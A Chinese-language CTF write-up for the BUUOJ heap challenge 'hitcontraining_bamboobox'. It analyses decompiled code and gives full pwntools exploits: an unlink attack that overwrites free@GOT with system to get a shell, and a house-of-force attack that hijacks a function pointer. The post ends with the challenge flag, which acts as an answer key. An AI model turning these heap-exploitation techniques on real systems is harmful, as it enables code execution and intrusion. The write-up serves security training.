# hitcontraining_bamboobox

[题目地址](https://buuoj.cn/challenges#hitcontraining_bamboobox)

为了调试这道题装了ubuntu虚拟机，结果发现架构不对根本运行不了，能运行的架构我又装不了，浪费我一个半小时……

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

这题main的实现有些奇怪。注意到程序打印欢迎语句和再见语句是用函数指针实现的，正常人写代码根本就不可能这么写，只能说明这里有猫腻。先把其他函数看完再说。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (**v4)(void); // [rsp+8h] [rbp-18h]
  char choice[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v4 = (void (**)(void))malloc(0x10uLL);
  *v4 = (void (*)(void))hello_message;
  v4[1] = (void (*)(void))goodbye_message;
  (*v4)();
  while ( 1 )
  {
    menu();
    read(0, choice, 8uLL);
    switch ( atoi(choice) )
    {
      case 1:
        show_item();
        break;
      case 2:
        add_item();
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item();
        break;
      case 5:
        v4[1]();
        exit(0);
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
```

展示物品。没啥看的，按照索引一个一个把索引和对应的物品名打印出来而已。

```c
int show_item()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No item in the box");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *((_QWORD *)&box + 2 * i) )
      printf("%d : %s", (unsigned int)i, *((const char **)&box + 2 * i));
  }
  return puts(byte_401089);
}
```

添加物品，又出现了错位的情况，把本来在一起的大小数据和内容指针分成2个不同的列表了。根据[wp](https://blog.csdn.net/mcmuyanga/article/details/114291792)的调试情况，它们是在一起的。开始做heap题前最好先随便申请几个堆块，确定程序里堆块的布局情况。

```c
__int64 add_item()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("the box is full");
  }
  else
  {
    printf("Please enter the length of item name:");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    if ( !v2 )
    {
      puts("invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !*((_QWORD *)&box + 2 * i) )
      {
        *((_DWORD *)&itemlist + 4 * i) = v2;
        *((_QWORD *)&box + 2 * i) = malloc(v2);
        printf("Please enter the name of item:");
        *(_BYTE *)(*((_QWORD *)&box + 2 * i) + (int)read(0, *((void **)&box + 2 * i), v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
```

修改物品。太明显一个堆溢出。

```c
unsigned __int64 change_item()
{
  int v1; // [rsp+4h] [rbp-2Ch]
  int v2; // [rsp+8h] [rbp-28h]
  char buf[16]; // [rsp+10h] [rbp-20h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&box + 2 * v1) )
    {
      printf("Please enter the length of item name:");// 看到这句话基本不用过多思考了，堆溢出
      read(0, nptr, 8uLL);
      v2 = atoi(nptr);
      printf("Please enter the new name of the item:");
      *(_BYTE *)(*((_QWORD *)&box + 2 * v1) + (int)read(0, *((void **)&box + 2 * v1), v2)) = 0;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

移除物品没啥问题。

```c
unsigned __int64 remove_item()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index of item:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&box + 2 * v1) )
    {
      free(*((void **)&box + 2 * v1));
      *((_QWORD *)&box + 2 * v1) = 0LL;
      *((_DWORD *)&itemlist + 4 * v1) = 0;
      puts("remove successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No item in the box");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

这题正确的解法应该是从main函数奇怪的打印实现入手，利用[house of force](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#_1)结合程序里给好的后门函数获取flag。然而buu环境flag的路径错了，本地用house of force打通后远程是打不通的。还是要靠我们的unlink。

```python
from pwn import *
r=remote("node4.buuoj.cn",28967)
context.log_level="debug"


def add(length,context):
    r.recvuntil("Your choice:")
    r.sendline("2")
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the name of item:")
    r.send(context)

def edit(idx,length,context):
    r.recvuntil("Your choice:")
    r.sendline("3")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))
    r.recvuntil("Please enter the length of item name:")
    r.sendline(str(length))
    r.recvuntil("Please enter the new name of the item:")
    r.send(context)

def free(idx):
    r.recvuntil("Your choice:")
    r.sendline("4")
    r.recvuntil("Please enter the index of item:")
    r.sendline(str(idx))

def show():
    r.sendlineafter("Your choice:", "1")

add(0x40,'a' * 8)
add(0x80,'b' * 8)
add(0x80,'c' * 8)
add(0x20,'/bin/sh\x00')
#gdb.attach(r)

ptr=0x6020c8  #这里是存储要使用unlink攻击的堆块的地址。如果把要使用攻击的堆块叫做chunk，地址叫做ptr，它们的关系是*ptr=chunk
fd=ptr-0x18   #这里和下面都是公式了
bk=ptr-0x10

fake_chunk=p64(0)    #在0号堆块里伪造一个堆块
fake_chunk+=p64(0x41) #伪造堆块的大小
fake_chunk+=p64(fd)    #公式fd和bk
fake_chunk+=p64(bk)
fake_chunk+=b'\x00'*0x20  #填充的字节，为了下面能够溢出到1号堆块，也算在伪造堆块的大小里
fake_chunk+=p64(0x40)  #prev_size，和伪造堆块的size一致
fake_chunk+=p64(0x90)  #把1号堆块的size从0x91覆盖至0x90。0x91表示前一堆块已被分配，不是free状态，不是我们想要的，遂改成0x90

edit(0,len(fake_chunk),fake_chunk)
#gdb.attach(r)

free(1)  #执行unlink。现在ptr处装着ptr-0x18,即*ptr=ptr-0x18=0x6020c8-0x18=0x6020b0。这个位置正是itemlist前16个字节的地方
free_got=0x602018
payload=p64(0)+p64(0)+p64(0x40)+p64(free_got)  #两个p64(0)填充16个字节，0x40是大小，不要改动，把第一个内容指针覆盖为free_got
edit(0,len(fake_chunk),payload)
#gdb.attach(r)

show()  #那么就能泄露free_got的地址了
free_addr=u64(r.recvuntil("\x7f")[-6: ].ljust(8, b'\x00')) 
log.info("free_addr:%x",free_addr)
libc_base=free_addr-541936
log.info("libc_addr:%x",libc_base)
system_addr=libc_base+283536
log.info("system_addr:%x",system_addr)
edit(0,0x8,p64(system_addr))   #编辑0号堆块就是编辑free_got，改为system

#gdb.attach(r)


free(3)
r.interactive()
```

如果house of force能用的话，这题会简单不少。house of force攻击也比unlink攻击好理解，关键在于glibc对堆块的管理。在glibc尝试给用户分配堆块时，会先看各个bin，有符合大小的就返回。如果没有，就会去topchunk切割出来一块分配个用户。这个topchunk说白了还是个chunk，我们能不能溢出到topchunk呢？答案是可以。再想一下，从topchunk分配一个堆块后，topchunk的指针就会下移。如果我们能控制topchunk的指针移到目标地址，此时再分配一个chunk不就能任意地址写了吗？

不过还有几个问题需要考虑。查看glibc源码，切割topchunk之前要求topchunk有那么大，用size域来表示。这个不难解决，前面提到能够溢出到topchunk，就能改它的size，直接改成0xffffffffffffffff，这还不够就见鬼了。另一个问题是假如我们想分配到的chunk地址比现有的topchunk地址高，怎么办？可以申请一个负数大小的chunk，根据计算机数字的[二进制原理](https://zhuanlan.zhihu.com/p/99082236)，就可以把topchunk指针抬升到目标地址了。

```python
from pwn import *

#p=remote("node3.buuoj.cn",27403)
p=process("./bamboobox")
elf=ELF('./bamboobox')
context.log_level="debug"

def add(length,name):
	p.recvuntil(":")
	p.sendline('2')
	p.recvuntil(':')
	p.sendline(str(length))
	p.recvuntil(":")
	p.sendline(name)
 
def edit(idx,length,name):
	p.recvuntil(':')
	p.sendline('3')
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil(":")
	p.sendline(str(length))
	p.recvuntil(':')
	p.sendline(name)
 
def free(idx):
	p.revcuntil(":")
	p.sendline("4")
	p.recvuntil(":")
	p.sendline(str(idx))
 
def show():
	p.recvuntil(":")
	p.sendline("1")

magic = 0x400d49  #后门函数
 
add(0x30,'aaaa')
#gdb.attach(p)

payload = 0x30 * b'a'
payload += b'a' * 8 + p64(0xffffffffffffffff)  #溢出到topchunk的size域
edit(0,0x41,payload)
#gdb.attach(p)

offset = -(0x60+0x8+0xf)  #计算要申请多大的chunk才能得到目标地址的topchunk指针
add(offset,'aaaa')
add(0x10,p64(magic) * 2)  #现在申请到了main函数的函数指针的位置，改为后门函数直接获得flag
 
#gdb.attach(p)
 
p.interactive()
```

偏移的计算一般就是`目标地址-当前topchunk指针`。不过还有一些关于源码的问题要考虑，详情看ctfwiki。

## Flag
> flag{dce1bf63-2e80-48b8-bf1a-2506db98f92d}